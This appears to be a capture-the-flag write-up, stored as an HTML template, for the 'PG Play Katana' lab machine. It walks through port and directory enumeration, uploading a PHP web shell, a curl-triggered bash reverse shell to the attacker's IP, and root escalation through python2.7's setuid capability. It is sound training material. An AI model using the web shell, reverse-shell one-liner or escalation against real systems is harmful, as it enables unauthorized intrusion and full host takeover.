@@ -1,0 +1,188 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Katana</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Medium | MyRating : Easy</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE    SERVICE       VERSION
+21/tcp    open     ftp           vsftpd 3.0.3
+22/tcp    open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
+|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
+|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
+80/tcp    open     http          Apache httpd 2.4.38 ((Debian))
+|_http-title: Katana X
+|_http-server-header: Apache/2.4.38 (Debian)
+472/tcp   filtered ljk-login
+3706/tcp  filtered rt-event
+7080/tcp  open     ssl/empowerid LiteSpeed
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: LiteSpeed
+| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
+| Not valid before: 2020-05-11T13:57:36
+|_Not valid after:  2022-05-11T13:57:36
+| tls-alpn: 
+|   h2
+|   spdy/3
+|   spdy/2
+|_  http/1.1
+|_http-title: Did not follow redirect to https://192.168.222.83:7080/
+8088/tcp  open     http          LiteSpeed httpd
+|_http-server-header: LiteSpeed
+|_http-title: Katana X
+8715/tcp  open     http          nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: 401 Authorization Required
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Restricted Content</code></pre></div>
+
+
+<p class="text">There are many open ports. Because the ftp client doesn't allow anonymous login, the targets would be those open http(s) servers.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/katana/1.png' %}" alt="">
+    <p class="text">Thoguh there are many websites, all of them we can access returns the same image of katana. I have to enumerate all of them first.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -t 70</u>
+===============================================================
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.hta                 (Status: 403) [Size: 279]
+/ebook                (Status: 301) [Size: 316] [--&lt; http://192.168.222.83/ebook/]
+/index.html           (Status: 200) [Size: 655]
+/server-status        (Status: 403) [Size: 279]
+
+===============================================================</code></pre></div>
+
+<p class="text">The directory ebook is interesting. But before browse it, we have to enumerate other ports.</p>
+
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP:7080 -t 70</u>
+===============================================================
+/admin.php            (Status: 403) [Size: 1227]
+/docs                 (Status: 301) [Size: 1260] [--&gt; https://192.168.222.83:7080/docs/]
+/favicon.ico          (Status: 200) [Size: 1150]
+/index.php            (Status: 200) [Size: 686]
+/index3.php           (Status: 403) [Size: 1227]
+/index2.php           (Status: 403) [Size: 1227]
+/info.php             (Status: 403) [Size: 1227]
+/infos.php            (Status: 403) [Size: 1227]
+/lib                  (Status: 301) [Size: 1260] [--&gt; https://192.168.222.83:7080/lib/]
+/phpinfo.php          (Status: 403) [Size: 1227]
+/phpinfos.php         (Status: 403) [Size: 1227]
+/res                  (Status: 301) [Size: 1260] [--&gt; https://192.168.222.83:7080/res/]
+/view                 (Status: 301) [Size: 1260] [--&gt; https://192.168.222.83:7080/view/]
+/xmlrpc.php           (Status: 403) [Size: 1227]
+
+===============================================================</code></pre></div>
+
+<p class="text">Though there are many dires, allmost all of them returned 403. </p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP:8088 -x html,php -t 70</u>
+===============================================================
+/.htaccess            (Status: 403) [Size: 1227]
+/blocked              (Status: 301) [Size: 1260] [--&gt; http://192.168.222.83:8088/blocked/]
+/cgi-bin              (Status: 301) [Size: 1260] [--&gt; http://192.168.222.83:8088/cgi-bin/]
+/css                  (Status: 301) [Size: 1260] [--&gt; http://192.168.222.83:8088/css/]
+/docs                 (Status: 301) [Size: 1260] [--&gt; http://192.168.222.83:8088/docs/]
+/error404.html        (Status: 200) [Size: 195]
+/img                  (Status: 301) [Size: 1260] [--&gt; http://192.168.222.83:8088/img/]
+/index.html           (Status: 200) [Size: 655]
+/index.html           (Status: 200) [Size: 655]
+/phpinfo.php          (Status: 200) [Size: 50737]
+/protected            (Status: 301) [Size: 1260] [--&gt; http://192.168.222.83:8088/protected/]
+/upload.html          (Status: 200) [Size: 6480]
+
+===============================================================</code></pre></div>
+<p class="text">There is interesting page named upload.html.</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP:8088 -x html,php -t 70</u>
+===============================================================
+/.htpasswd            (Status: 403) [Size: 169]
+/.htaccess            (Status: 403) [Size: 169]
+/.hta                 (Status: 403) [Size: 169]
+
+===============================================================</code></pre></div>
+
+<p class="text">There is no responses.</p>
+
+
+<p class="text">We enumerated all pages properly. So, let's browse them. I would like to start with upload.html because if we can upload any file, we can easily establish first connection.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/katana/2.png' %}" alt="">
+    <p class="text">As expected, there is an upload form. Let's check if we can upload any file with web shell written in php.</p>
+</div>
+<p class="text">I used web shell below:</p>
+<div class="code-box"><pre><code>&lt;?php system($_REQUEST['cmd']);?&gt;</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/katana/3.png' %}" alt="">
+    <p class="text">No error massege is returned. So, we can assume it succeed. Also, according to this page, <u>Moved to other web server: /tmp/phpoVbute ====> /opt/manager/html/katana_simple_shell.php</u>, which implies the uploaded file is written another port site.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/katana/4.png' %}" alt="">
+    <p class="text">On the root directory of port 8175, I found uploaded file. <u>http://192.168.222.83:8715/katana_simple_shell.php?cmd=id</u>. <br><br>We can get reverse shell with this file. <br><u>※Don't forget to open port with nc.</u></p>
+</div>
+
+<div class="code-box"><pre><code>└─$ curl -G http://192.168.222.83:8715/katana_simple_shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.205/4444 0>&1'"
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.222.83] 42822
+bash: cannot set terminal process group (422): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@katana:/opt/manager/html$ </code></pre></div>
+
+<p class="text">I got reverse shell with www-data user.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Before collecting information, let's make connection stable.</p>
+<div class="code-box"><pre><code>script /dev/null -c /bin/bash
+Script started, output log file is '/dev/null'.
+$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+
+$ stty raw -echo; fg
+nc -lnvp 4444
+           reset
+reset: unknown terminal type unknown
+Terminal type? screen</code></pre></div>
+
+<p class="text">When I was enumerating system info, I found capabilities.</p>
+<div class="code-box"><pre><code>www-data@katana:/opt/manager/html$ <u>getcap -r / 2>/dev/null</u>
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid+ep
+www-data@katana:/opt/manager/html$ </code></pre></div>
+
+
+
+
+<p class="text">+ep flags: <br>1. e = Effective (the capability is active when the program runs). <br>2. p = Permitted (the capability is allowed to be effective).</p>
+<p class="text">cap_setuid, cap_setgid : can change UIDs/GIDs</p>
+<p class="text">Therefore, we can generate new bash with setuid(0) function.</p>
+
+
+<div class="code-box"><pre><code>www-data@katana:~$ <u>/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</u>
+root@katana:/opt/manager/html# whoami
+root</code></pre></div>
+
+
+<p class="text">We successfully changed to root user. You can locate local.txt under /var/www/ and root text under /root.</p>
+
+
+</body>
+</html>
